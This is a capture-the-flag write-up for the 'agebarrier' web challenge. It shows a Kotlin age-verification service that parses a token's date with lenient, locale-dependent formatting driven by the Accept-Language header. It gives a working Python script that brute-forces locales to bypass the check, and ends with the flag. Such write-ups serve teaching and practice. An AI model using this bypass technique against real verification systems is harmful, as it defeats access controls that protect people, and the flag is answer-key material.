
````markdown
# agebarrier

**Category:** Web  
**Author of Challenge:** 0xle  
**Team:** Davidslingshot  

---

## 📌 Challenge Description

The youngsters are easily bypassing age verification systems nowadays, so I made my very own bleeding-edge and future-proof age verification system. Surely, it's impenetrable?

---

## 🔍 Vulnerability

```kotlin
@Service
class DefaultDateTimeFormatterProviderService : DateTimeFormatterProviderService {
    override fun get(): DateTimeFormatter {
        return DateTimeFormatter.ofLocalizedDate(FormatStyle.SHORT)
            .withLocale(LocaleContextHolder.getLocale())
            .withResolverStyle(ResolverStyle.LENIENT)
    }
}
val formatter = DateTimeFormatter.ofLocalizedDate(FormatStyle.SHORT)
    .withLocale(LocaleContextHolder.getLocale())        // uses request locale (Accept-Language)
    .withResolverStyle(ResolverStyle.LENIENT)          // lenient parsing

val issued = LocalDate.parse(claims["iss"], formatter)
````

Normally, when you visit the website, it takes the **current date** and stores it inside a **JWT token**, then sends that token back.
Example token for `30-08-2025`:

```
eyJlcGsiOnsia3R5IjoiT0tQIiwiY3J2IjoiWDI1NTE5IiwieCI6IllCU0lfLWlsLVplN25naGZOT1dpV1lKczVQVHB5YUlKYnpuTk5fNmluajQifSwiZW5jIjoiQTI1NkdDTSIsImFsZyI6IkVDREgtRVMrQTI1NktXIn0.nWiW0Bjgb5x7wQWhXjJfe5NfcFDwKB8rqg6n2z_gUk3RkeXQFmz2zA.VY4BdY_vmGbCYZzP.9TbMpq7CnQPcY1Ca7jPORIv4Cr5eXQhIOUYs22h7rStK4zaaCi6hkpIb08rqHSoAiJmI6ZaEM934TyXrU-iPbNfxDYas26-lYJVKzESYfhgijLh2YVJr-vv_VtJzK8iFZv5nS9bf5sqHih0AlXlm87dFLcRQ49e7VMIy4yZf_SexZWw.OsEkYiAH1k9yN4J7vfb2TA
```

---

## ⚡ Exploit Idea

The exploit comes from how the **server parses dates**.
It uses `DateTimeFormatter.ofLocalizedDate(FormatStyle.SHORT)` **with the locale taken from the `Accept-Language` header**.
Because parsing is **lenient**, different locales interpret the same short date differently.

### 1. 🇺🇸 USA (`en-US`)

* Pattern: `M/d/yy`
* Example: `8/30/25`
* Ambiguity: year `25` → can be **2025, 1925, or 0025** depending on parsing.

### 2. 🇨🇳 China (`zh-CN`)

* Pattern: `yy/M/d`
* Example: `25/8/30`
* Ambiguity: year `25` → can be misinterpreted as **year 25 AD**.

By choosing the right `Accept-Language`, the server thinks the token is **ancient/expired**, bypassing checks.

---

## 🔨 Exploit Script

We brute force locales to find the one that tricks the server into accepting our token.

```python
import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://d0172ccd-4c60-4154-afd5-f8b291fef6c7.chall.nnsc.tf"  # change if needed
TIMEOUT = 10

def issue_token(session, issue_locale="en-US"):
    headers = {"Accept-Language": issue_locale}
    r = session.post(f"{BASE}/tokens", headers=headers, timeout=TIMEOUT, verify=False)
    r.raise_for_status()
    return r.json()["token"]

def try_claim(session, token, product_id=3, accept_language=None):
    headers = {}
    if accept_language:
        headers["Accept-Language"] = accept_language
    payload = {"token": token}
    r = session.post(f"{BASE}/products/{product_id}", json=payload, headers=headers, timeout=TIMEOUT, verify=False)
    return r

def main():
    s = requests.Session()
    print("[*] Issuing token...")
    try:
        token = issue_token(s, issue_locale="en-US")
    except Exception as e:
        print("[-] Failed to issue token:", e)
        sys.exit(1)
    print("[+] Got token (length {})".format(len(token)))

    locales = [
        "en-US", "en-GB", "fr-FR", "de-DE", "sv-SE", "fi-FI", "nl-NL",
        "it-IT", "es-ES", "pt-BR", "ru-RU", "zh-CN", "ja-JP", "ar-SA",
        "ko-KR", "da-DK", "nb-NO", "pl-PL", "cs-CZ"
    ]

    print("[*] Trying claim with different Accept-Language values...")
    for loc in locales:
        try:
            r = try_claim(s, token, product_id=3, accept_language=loc)
            status = r.status_code
            if status == 200:
                try:
                    body = r.json()
                except Exception:
                    body = r.text
                print(f"[!!!] Success with Accept-Language: {loc}")
                print("Response:", body)
                return
            else:
                print(f"[-] {loc}: HTTP {status}")
        except Exception as e:
            print(f"[-] {loc}: request failed ({e})")

    print("[*] None of the tested locales succeeded. Try more locales or tweak issuance locale.")

if __name__ == "__main__":
    main()
```

---

## 🏁 Flag

```
NNS{D4tes_4nd_t1m3z0n3s_ar3_h4rd_06993d8ad651}
```

---

